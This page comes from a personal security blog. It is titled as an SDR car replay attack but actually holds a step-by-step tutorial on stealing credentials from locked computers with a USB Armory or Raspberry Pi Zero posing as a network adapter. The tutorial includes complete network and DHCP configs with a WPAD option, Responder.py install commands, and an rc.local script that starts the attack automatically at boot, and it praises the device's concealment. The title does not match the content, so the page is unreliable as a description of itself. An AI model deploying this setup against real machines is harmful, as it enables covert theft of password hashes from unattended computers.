@@ -1,0 +1,567 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head>
+         
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <title>Car hacking: Replay attack /w SDR</title>
+        
+        <style>
+
+    html body {
+        font-family: 'Raleway', sans-serif;
+        background-color: white;
+    }
+
+    :root {
+        --accent: red;
+        --border-width:  5px ;
+    }
+
+</style>
+
+
+<link rel="stylesheet" href="https://ivanorsolic.github.io/css/main.css">
+
+
+
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Raleway">
+
+
+ <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/solarized-dark.min.css"> 
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+ 
+
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+
+     <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/bash.min.js"></script>  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/go.min.js"></script>  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/haskell.min.js"></script>  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/kotlin.min.js"></script>  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/scala.min.js"></script>  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/swift.min.js"></script>  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/python.min.js"></script>  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/java.min.js"></script>  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/c#.min.js"></script> 
+
+    <script>hljs.initHighlightingOnLoad();</script>
+
+
+
+
+
+
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+
+
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+
+
+<script>$(document).on('click', function() { $('.collapse').collapse('hide'); })</script>
+ <meta name="generator" content="Hugo 0.40.3" />
+        
+
+        
+    </head>
+
+    
+    
+    <script type="text/javascript" async
+      src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+    </script>
+    
+
+    <body>
+         
+        <nav class="navbar navbar-default navbar-fixed-top">
+
+            <div class="container">
+
+                <div class="navbar-header">
+
+                    <a class="navbar-brand visible-xs" href="#">Car hacking: Replay attack /w SDR</a>
+
+                    <button class="navbar-toggle" data-target=".navbar-collapse" data-toggle="collapse">
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                    </button>
+
+                </div>
+
+                <div class="collapse navbar-collapse">
+
+                    
+                        <ul class="nav navbar-nav">
+                            
+                                <li><a href="/">Home</a></li>
+                            
+                                <li><a href="/post/">Tuts and write-ups</a></li>
+                            
+                                <li><a href="/project/">Projects</a></li>
+                            
+                        </ul>
+                    
+
+                    
+                        <ul class="nav navbar-nav navbar-right">
+                            
+                                <li class="navbar-icon"><a href="mailto:ivanorsolic@gmail.com"><i class="fa fa-envelope-o"></i></a></li>
+                            
+                                <li class="navbar-icon"><a href="https://github.com/ivanorsolic/"><i class="fa fa-github"></i></a></li>
+                            
+                                <li class="navbar-icon"><a href="https://twitter.com/ivanorsolic/"><i class="fa fa-twitter"></i></a></li>
+                            
+                                <li class="navbar-icon"><a href="https://www.linkedin.com/in/ivanorsolic/"><i class="fa fa-linkedin"></i></a></li>
+                            
+                                <li class="navbar-icon"><a href="https://www.stackoverflow.com/ivanorsolic/"><i class="fa fa-stack-overflow"></i></a></li>
+                            
+                        </ul>
+                    
+
+                </div>
+
+            </div>
+
+        </nav>
+
+
+<main>
+
+    <div class="item">
+
+    
+    
+    
+
+    
+    
+
+    <h4><a href="/post/car-hacking/">Car hacking: Replay attack /w SDR</a></h4>
+    <h5>January 28, 2017</h5>
+    
+    <a href="https://ivanorsolic.github.io/tags/sdr"><kbd class="item-tag">sdr</kbd></a>
+    
+    <a href="https://ivanorsolic.github.io/tags/car-hacking"><kbd class="item-tag">car hacking</kbd></a>
+    
+    <a href="https://ivanorsolic.github.io/tags/infosec"><kbd class="item-tag">infosec</kbd></a>
+    
+    <a href="https://ivanorsolic.github.io/tags/embedded"><kbd class="item-tag">embedded</kbd></a>
+    
+
+</div>
+
+
+    <br> <div class="text-justify">
+
+<h1 id="replay-attacks">Replay attacks</h1>
+
+<p><img src="https://blog.dashlane.com/wp-content/uploads/2017/05/5-Ways-Hackers-Steal-Passwords.png#center" alt="Stealing creds" /></p>
+
+<p align="center">
+<em>Image taken from: <a href="https://blog.dashlane.com/hackers-steal-your-reused-passwords-using-credential-stuffing/">
+Dashlane</a></em>
+</p>
+
+<p>This tutorial will go through stealing credentials from a fully locked, fully patched (at the time of writing) Windows, Mac OS X or Linux machine.</p>
+
+<p>Since the time of writing, the attack has become very well documented on the internet, and patches were released from OS manufacturers such as Microsoft<sup class="footnote-ref" id="fnref:CVE"><a href="#fn:CVE">1</a></sup>. Unfortunately, even after testing the attack on a Windows 10 PC with the newest patches, it was still successful.</p>
+
+<p>On a final note, this work was made possible by Rob &lsquo;Mubix&rsquo; Fuller<sup class="footnote-ref" id="fnref:Mubix"><a href="#fn:Mubix">2</a></sup>, which has made an awesome documentation about the implementation of this attack using USB Armory, and most of the work described later on heavily references his research and work.</p>
+
+<h1 id="responder-py">Responder.py</h1>
+
+<p><img src="https://cdn.plixer.com/wp-content/uploads/2016/09/dns-poisoning2.png#center" alt="DNS poisoning" /></p>
+
+<p align="center">
+<em>Image taken from: <a href="https://www.plixer.com/blog/dns/dns-poisoning-fix/">
+Plixer</a></em>
+</p>
+
+<p>As the <a href="https://github.com/SpiderLabs/Responder">Github repo</a> nicely explains:</p>
+
+<p>&ldquo;<em>Responder is a LLMNR, NBT-NS and MDNS poisoner, with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP and Basic HTTP authentication.</em>&ldquo;</p>
+
+<p>Without explaining every of the upper mentioned protocols in depth:</p>
+
+<p><strong>Responder is basically a Python program which enables DNS poisoning on a target pc, along with built-in auth servers for HTTP, SMB, FTP, LDAP and MSSQL protocols, and also supports the NTLM authentication protocol (Windows Challenge/Response), which is used in the Microsoft Windows operating systems.</strong></p>
+
+<p>Responder can be described as a program which waits for any outbound request from a PC  to the outside network, like an FTP request, and then falsely represents itself as the requested server, enabling it to intercept all communication between the targeted PC and the server.</p>
+
+<p>Depending on the protocol and the type of authentication, Responder forwards the auth request towards the server, which can in turn respond with a challenge that the target has to respond to in order to successfully authenticate. Responder forwards that challenge towards the target, to which the targeted PC responds with a generated response, possibly a hash of its password made using the challenge sent by the server, which it sends back to the Responder, thinking it&rsquo;s in fact, the target server.</p>
+
+<p>Afterwards, depending on the protocol and its version, e.g. NTLMv1, we can &ldquo;crack&rdquo; the hash in order to obtain the password, or just &ldquo;pass-the-hash&rdquo; to the server and authenticate as the targeted PC.</p>
+
+<h1 id="usb-armory-vs-rpi-zero">USB armory vs RPi Zero</h1>
+
+<p>The USB Armory or the RPi Zero can be used as the hardware components for this attack. They&rsquo;re both SoC-s (System on a Chip), which contain all of the components on a single board (RAM, GPU, CPU, etc.).</p>
+
+<p>Both devices can run various Linux distros, but for this tutorial we&rsquo;ll use a Debian distro. If you&rsquo;re an advanced user, and want more options, you can also use Kali.</p>
+
+<h3 id="usb-armory">USB Armory</h3>
+
+<p><img src="https://inversepath.com/images/usbarmory_coin.jpg#center" alt="USB Armory" /></p>
+
+<p align="center">
+<em>Image taken from: <a href="https://inversepath.com/usbarmory">
+InversePath</a></em>
+</p>
+
+<p><strong>Specs:</strong></p>
+
+<ul>
+<li><strong>CPU</strong>: NXP i.MX53 ARM® Cortex™-A8 800Mhz</li>
+<li><strong>RAM</strong>: 512MB DDR3 RAM</li>
+<li><strong>GPU</strong>: None</li>
+</ul>
+
+<h3 id="raspberry-pi-zero">Raspberry Pi Zero</h3>
+
+<p><img src="https://www.raspberrypi.org/app/uploads/2017/05/Raspberry-Pi-Zero-Overhead-1-1748x1080.jpg#center" alt="RPi Zero" /></p>
+
+<p align="center">
+<em>Image taken from: <a href="https://www.raspberrypi.org/products/raspberry-pi-zero/">
+Raspberry Pi</a></em>
+</p>
+
+<p><strong>Specs:</strong></p>
+
+<ul>
+<li><strong>CPU</strong>: Broadcom BCM2835 1GHz</li>
+<li><strong>RAM</strong>: 512MB RAM (shared with GPU)</li>
+<li><strong>GPU</strong>: Broadcom VideoCore IV @ 250 MHz</li>
+</ul>
+
+<p>There isn&rsquo;t too big of a difference between the two devices in terms of main components. But one of the big differences is that the USB Armory doesn&rsquo;t have a dedicated GPU, unlike the RPi which can actually run FullHD video without breaking a sweat.</p>
+
+<p>That being said, the USB armory wasn&rsquo;t meant to be used as an everyday PC. Even though it lacks a GPU, it has a plethora of other security features, since its primary target audience are security enthusiasts, which is why it supports secure boot and ARM® TrustZone® and can be used as a portable pentesting platform, an end-to-end VPN tunneling router, encrypted file storage with host auth and data self-destruct.</p>
+
+<p>On the other hand, the RPi&rsquo;s main purpose is to be used as anything from a day-to-day PC to a home automation controller or a sensor hub.</p>
+
+<h2 id="cool-story-bro-why-do-we-care">Cool story bro - why do we care?</h2>
+
+<p>Yeah, one of the questions that may have crossed your mind was:</p>
+
+<p><strong><em>Why would we then even consider using a RPi as a platform for this attack, if the USB Armory was made for such purposes?</em></strong></p>
+
+<h3 id="wait-for-it">Wait for it:</h3>
+
+<p><img src="https://media.giphy.com/media/uCLrqp14d6JH2/giphy.gif#center" alt="Sailor Moon Bank" /></p>
+
+<p align="center">
+<em>Image taken from: <a href="https://giphy.com/gifs/uCLrqp14d6JH2">
+Giphy</a></em>
+</p>
+
+<p><strong>The moneyz.</strong></p>
+
+<p><strong>If you want to get an USB Armory with a few essentials, such as an acrylic case and a microSD, you&rsquo;re gonna have to be ready to pop up to €150.</strong></p>
+
+<p>On the other hand, <strong>to get the RPi</strong> (just the board), <strong>you&rsquo;re gonna have to pop up</strong> <strong>a miserable €5.</strong></p>
+
+<p>Even though the Armory has a plethora of advantages for InfoSec projects, if you wanna make more than one project, it&rsquo;s gonna get pretty expensive, pretty fast. While on the other hand you won&rsquo;t mind using an RPi for pretty much anything, since its in the price range of a nice kebab.</p>
+
+<p>And we&rsquo;re lucky for it. The RPi is an <strong>amazing</strong> bang for the buck, which, for only €5, supports a number of fully blown OS&rsquo;s (mostly Linux distros, but others aswell), but also <strong>USB OTG</strong>, which makes us able to use it both as a host and as a regular device, which is, <em>wink wink</em> <strong>crucial for our planned attack</strong>.</p>
+
+<p>And the last interesting characteristic for this attack:</p>
+
+<p><strong>Both devices are</strong> roughly <strong>the size of a regular *flash</strong>* memory (USB Stick), which enables <strong>concealment and stealthy engagements</strong>.</p>
+
+<h1 id="implementing-the-attack">Implementing the attack</h1>
+
+<p>Let&rsquo;s get down to it.</p>
+
+<p>We mentioned earlier that <strong>both of the devices support OTG functionality<sup class="footnote-ref" id="fnref:OTG"><a href="#fn:OTG">3</a></sup></strong>.</p>
+
+<p>Since the <strong>USB protocol is Plug-and-Play</strong><sup class="footnote-ref" id="fnref:PNP"><a href="#fn:PNP">4</a></sup>, <strong>the device will be installed on the targeted PC even if the target is locked</strong>.</p>
+
+<p>That being said, of course there are limitations as to which devices can be installed automatically, but to our luck, <strong>Ethernet/LAN devices are automatically trusted on almost all systems.</strong></p>
+
+<p>Understanding both, we can configure our devices to present themselves to the target as Ethernet/LAN adapters - Remote Network Driver Interface Specification (<strong>RNDIS <sup class="footnote-ref" id="fnref:RNDIS"><a href="#fn:RNDIS">5</a></sup></strong>) Ethernet gadgets, which assume priority over all other network interfaces on the PC, which allows them to reroute all of the traffic through themselves.</p>
+
+<p>After the device connects to the target and installs itself as an RNDIS gadget (usually just a couple of seconds), the device should start the Responder.py which configures it as the default gateway, DNS server, WPAD server and any other server the PC could send requests to.</p>
+
+<p>And you&rsquo;re probably thinking:</p>
+
+<p><strong>But the PC is locked, how is this possible?</strong></p>
+
+<p>Our PCs generate traffic every second they&rsquo;re connected to the network, locked or not, even if we haven&rsquo;t manually run any apps that would use the network. Also, at least in the context of this little research, our PCs will completely trust the local network (<strong>important note: this is true if the settings are at their default values</strong>), which in turn enables us to implement attacks like this.</p>
+
+<h2 id="setting-up-the-device">Setting up the device</h2>
+
+<p>The implementation of the attack requires preparing both the hardware and the software on it. It goes something like this:</p>
+
+<ol>
+<li>Installing an OS to the device</li>
+<li>Configuring the network interface</li>
+<li>Configuring the DHCP server</li>
+<li>Installing Responder and its dependencies</li>
+<li>Automating the process on boot</li>
+</ol>
+
+<p><strong>Note</strong>: <em>in the following parts, we&rsquo;ll describe the process for setting up the USB Armory. The process is very much alike (if not the same) for the RPi, once it has an OS up and running.</em></p>
+
+<h3 id="installing-an-os">Installing an OS</h3>
+
+<p>This part won&rsquo;t be covered in depth, since it is very well <strong>documented on the interwebz<sup class="footnote-ref" id="fnref:os"><a href="#fn:os">6</a></sup></strong> and the official sites of the devices used here. For our intents and purposes, we&rsquo;ve installed the latest Debian Linux at the time of writing on our device.</p>
+
+<h3 id="configuring-network-interfaces">Configuring network interfaces</h3>
+
+<p>We should configure the network interface on our OS (found here: <em>/etc/network/interfaces</em>) to use the usb0 interface as the default interface, with an assigned static IP address.</p>
+
+<h4 id="etc-network-interfaces-https-room362-com-post-2016-snagging-creds-from-locked-machines"><strong><a href="https://room362.com/post/2016/snagging-creds-from-locked-machines/">/etc/network/interfaces</a></strong></h4>
+
+<pre><code class="language-bash"># interfaces(5) file used by ifup(8) and ifdown(8)
+# Include files from /etc/network/interfaces.d:
+source-directory /etc/network/interfaces.d
+auto usb0
+allow-hotplug usb0
+iface usb0 inet static
+  address 192.168.2.201
+  netmask 255.255.255.0
+  gateway 192.168.2.1
+</code></pre>
+
+<h3 id="configuring-the-dhcp-server">Configuring the DHCP server</h3>
+
+<p>The only, but the most important thing while configuring the DHCP server is configuring the option <strong>local-proxy-config</strong> to use a <strong>WPAD file<sup class="footnote-ref" id="fnref:WPAD"><a href="#fn:WPAD">7</a></sup></strong>.</p>
+
+<p>The <strong>Web Proxy Auto-Discovery Protocol</strong> (<strong>WPAD</strong>)<sup class="footnote-ref" id="fnref:wpadwiki"><a href="#fn:wpadwiki">8</a></sup> is a method used by clients to locate the URL of a configuration file using DHCP and/or DNS discovery methods.</p>
+
+<p><strong>WPAD</strong> is a technology which helps clients, such as Web browsers, to automatically find the location of the PAC file using DNS or DHCP.</p>
+
+<p>A <strong>proxy auto-config (PAC)<sup class="footnote-ref" id="fnref:PAC"><a href="#fn:PAC">9</a></sup> file</strong> defines how web browsers and other user agents can automatically choose the appropriate proxy server (access method) for fetching a given URL.</p>
+
+<p>In layman terms, the option above tells the target to first use the WPAD file if it needs to find a URL, which in turn tells the target how to get to the requested URL using the PAC file instead of using DNS. One very interesting fact in the context of this attack is that DHCP has a higher priority than DNS, which means that if DHCP offers a WPAD URL, the PC won&rsquo;t do a single DNS lookup, it&rsquo;ll just get the URL using the way defined by the WPAD.</p>
+
+<h4 id="etc-dhcp-dhcpd-conf-https-room362-com-post-2016-snagging-creds-from-locked-machines"><a href="https://room362.com/post/2016/snagging-creds-from-locked-machines/"><strong>/etc/dhcp/dhcpd.conf</strong></a></h4>
+
+<pre><code>ddns-update-style none;
+
+option domain-name &quot;domain.local&quot;;
+option domain-name-servers 192.168.2.201;
+
+default-lease-time 60;
+max-lease-time 72;
+
+# If this DHCP server is the official DHCP server for the local
+# network, the authoritative directive should be uncommented.
+authoritative;
+
+# Use this to send dhcp log messages to a different log file (you also
+# have to hack syslog.conf to complete the redirection).
+log-facility local7;
+
+# wpad
+option local-proxy-config code 252 = text;
+
+# A slightly different configuration for an internal subnet.
+subnet 192.168.2.0 netmask 255.255.255.0 {
+  range 192.168.2.1 192.168.2.2;
+  option routers 192.168.2.201;
+  option local-proxy-config &quot;http://192.168.2.201/wpad.dat&quot;;
+}
+</code></pre>
+
+<h3 id="installing-responder-py-and-its-dependencies">Installing Responder.py and its dependencies</h3>
+
+<p>Responder can be found on <a href="https://github.com/SpiderLabs/Responder">SpiderLabs&rsquo;s GitHub repo</a>, the Trustwave security team. Responder needs the <a href="https://github.com/dlitz/pycrypto">Python Cryptography Toolkit</a> in order to work.</p>
+
+<pre><code class="language-bash"># PyCrypto
+git clone https://github.com/dlitz/pycrypto
+cd pycrypto
+python setup.py build
+python setup.py install
+
+# Responder
+git clone https://github.com/SpiderLabs/Responder
+cd Responder
+./Responder.py [options]
+</code></pre>
+
+<h3 id="automating-the-attack-on-device-boot">Automating the attack on device boot</h3>
+
+<p>The easiest way to do this is to edit the <a href="https://room362.com/post/2016/snagging-creds-from-locked-machines/"><strong>rc.local</strong></a> file:</p>
+
+<pre><code>#!/bin/sh -e
+
+# Clear leases
+rm -f /var/lib/dhcp/dhcpd.leases
+touch /var/lib/dhcp/dhcpd.leases
+
+# Start DHCP server
+/usr/sbin/dhcpd
+
+# Start Responder
+/usr/bin/screen -dmS responder bash -c 'cd /root/responder/; python Responder.py -I usb0 -f -w -r -d -F'
+
+exit 0
+</code></pre>
+
+<h1 id="the-results-of-the-attack">The results of the attack</h1>
+
+<p><strong>After plugging in the attack device into a fully patched Windows 10 PC (at the time of writing), the attack was successful. Using the Armory, it took on average about 10 seconds from plugging in to plugging out the device, which captured all of the credentials and hashes it could, and stored them in the Responder.db database file.</strong></p>
+
+<h2 id="poc-it-didn-t-happen">PoC || it didn&rsquo;t happen</h2>
+
+<h3 id="ntlmv2-hash"><strong>NTLMv2 hash</strong></h3>
+
+<p><img src="/img/hash1.png#center" alt="" /></p>
+
+<h3 id="smb-share"><strong>SMB Share</strong></h3>
+
+<p><img src="/img/responderlog.png#center" alt="" /></p>
+
+<h3 id="dns-poison"><strong>DNS Poison</strong></h3>
+
+<p><img src="/img/responderdns.png#center" alt="" /></p>
+
+<h3 id="misc"><strong>Misc</strong></h3>
+
+<p><img src="/img/responderlog2.png#center" alt="" /></p>
+<div class="footnotes">
+
+<hr />
+
+<ol>
+<li id="fn:CVE"><strong><a href="https://nvd.nist.gov/vuln/detail/CVE-2016-3302">CVE-2016-3302</a> / <a href="https://technet.microsoft.com/en-us/library/security/ms16-112.aspx">MS16-112</a></strong>.
+ <a class="footnote-return" href="#fnref:CVE"><sup>[return]</sup></a></li>
+<li id="fn:Mubix"><a href="https://room362.com/post/2016/snagging-creds-from-locked-machines/">Snagging creds from locked machines</a>
+ <a class="footnote-return" href="#fnref:Mubix"><sup>[return]</sup></a></li>
+<li id="fn:OTG"><a href="https://www.wikiwand.com/en/USB_On-The-Go">USB OTG</a>
+ <a class="footnote-return" href="#fnref:OTG"><sup>[return]</sup></a></li>
+<li id="fn:PNP"><a href="https://www.wikiwand.com/en/Plug_and_play">Plug-and-Play</a>
+ <a class="footnote-return" href="#fnref:PNP"><sup>[return]</sup></a></li>
+<li id="fn:RNDIS"><a href="https://winprotocoldoc.blob.core.windows.net/productionwindowsarchives/WinArchive/[MS-RNDIS].pdf">RNDIS specs</a>
+ <a class="footnote-return" href="#fnref:RNDIS"><sup>[return]</sup></a></li>
+<li id="fn:os"><a href="https://www.raspberrypi.org/documentation/installation/installing-images/">Raspberry Pi OS installation</a>, <a href="https://github.com/inversepath/usbarmory-debian-base_image">USB Armory Debian building process</a>
+ <a class="footnote-return" href="#fnref:os"><sup>[return]</sup></a></li>
+<li id="fn:WPAD"><a href="https://www.cisco.com/c/en/us/td/docs/security/web_security/connector/connector2972A/WPADAP.html">WPAD</a>
+ <a class="footnote-return" href="#fnref:WPAD"><sup>[return]</sup></a></li>
+<li id="fn:wpadwiki"><a href="https://www.wikiwand.com/en/Web_Proxy_Auto-Discovery_Protocol">Web Proxy Auto-Discovery Protocol</a>
+ <a class="footnote-return" href="#fnref:wpadwiki"><sup>[return]</sup></a></li>
+<li id="fn:PAC"><a href="https://www.wikiwand.com/en/Proxy_auto-config">Proxy auto-config</a>
+ <a class="footnote-return" href="#fnref:PAC"><sup>[return]</sup></a></li>
+</ol>
+</div>
+</div>
+
+    
+    
+
+    
+
+        <h4 class="page-header">Related</h4>
+
+         <div class="item">
+
+    
+    
+    
+
+    
+    
+
+    <h4><a href="/post/tempest/">Tempest attacks using a DVB-T stick</a></h4>
+    <h5>February 6, 2018</h5>
+    
+    <a href="https://ivanorsolic.github.io/tags/sdr"><kbd class="item-tag">sdr</kbd></a>
+    
+    <a href="https://ivanorsolic.github.io/tags/infosec"><kbd class="item-tag">infosec</kbd></a>
+    
+    <a href="https://ivanorsolic.github.io/tags/tut"><kbd class="item-tag">tut</kbd></a>
+    
+
+</div>
+  <div class="item">
+
+    
+    
+    
+
+    
+    
+
+    <h4><a href="/post/responder/">Snagging creds /w Responder.py</a></h4>
+    <h5>January 28, 2017</h5>
+    
+    <a href="https://ivanorsolic.github.io/tags/netsec"><kbd class="item-tag">netsec</kbd></a>
+    
+    <a href="https://ivanorsolic.github.io/tags/networking"><kbd class="item-tag">networking</kbd></a>
+    
+    <a href="https://ivanorsolic.github.io/tags/infosec"><kbd class="item-tag">infosec</kbd></a>
+    
+    <a href="https://ivanorsolic.github.io/tags/responder"><kbd class="item-tag">responder</kbd></a>
+    
+    <a href="https://ivanorsolic.github.io/tags/python"><kbd class="item-tag">python</kbd></a>
+    
+    <a href="https://ivanorsolic.github.io/tags/embedded"><kbd class="item-tag">embedded</kbd></a>
+    
+
+</div>
+  <div class="item">
+
+    
+    
+    
+
+    
+    
+
+    <h4><a href="/post/ai-and-ocr---volunteeringtoday/">AI and OCR: Volunteering.today</a></h4>
+    <h5>January 28, 2017</h5>
+    
+    <a href="https://ivanorsolic.github.io/tags/sdr"><kbd class="item-tag">sdr</kbd></a>
+    
+    <a href="https://ivanorsolic.github.io/tags/car-hacking"><kbd class="item-tag">car hacking</kbd></a>
+    
+    <a href="https://ivanorsolic.github.io/tags/infosec"><kbd class="item-tag">infosec</kbd></a>
+    
+    <a href="https://ivanorsolic.github.io/tags/embedded"><kbd class="item-tag">embedded</kbd></a>
+    
+
+</div>
+ 
+
+    
+
+    
+
+        <h4 class="page-header">Comments</h4>
+
+        <div id="disqus_thread"></div>
+<script>
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "oriblog" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+    
+
+</main>
+
+        <footer>
+
+            <p class="copyright text-muted">&copy; All rights reserved. Powered by <a href="https://gohugo.io">Hugo</a> and <a href="https://github.com/calintat/minimal">Minimal</a></p>
+
+        </footer>
+       
+    </body>
+
+</html>
+
